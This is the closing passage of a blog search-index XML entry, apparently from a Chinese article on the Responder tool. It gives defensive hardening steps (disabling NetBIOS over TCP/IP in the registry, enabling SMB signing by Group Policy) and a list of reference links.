src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661261.png" alt="禁用 TCP/IP 上的 NetBIOS "></p><blockquote><p>或者通过到注册表修改下面的键，并将值更改为2 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces{$ InterfaceID}\NetbiosOptions</p></blockquote></li><li><p>通过组策略启用 SMB 签名</p><p>SMB签名的更多细节以及可以定义的各种值可以在以下链接中找到：<br><a href="http://techgenix.com/secure-smb-connections/">http://techgenix.com/secure-smb-connections/</a><br><a href="https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx">https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx</a></p></li></ul><h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul><li><a href="https://github.com/SpiderLabs/Responder/blob/master/README.md">SpiderLabs/Responder - README.md</a></li><li><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/responder-20-owning-windows-networks-part-3/">Responder 2.0 - Owning Windows Networks part 3</a></li><li><a href="https://www.secpulse.com/archives/65503.html">渗透师指南之Responder</a></li><li><a href="https://www.jianshu.com/p/1b545a8b8b1e">内网渗透之Responder与Net-NTML hash</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>concept</tag>
      
      <tag>Web</tag>
      
      <tag>OWASP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
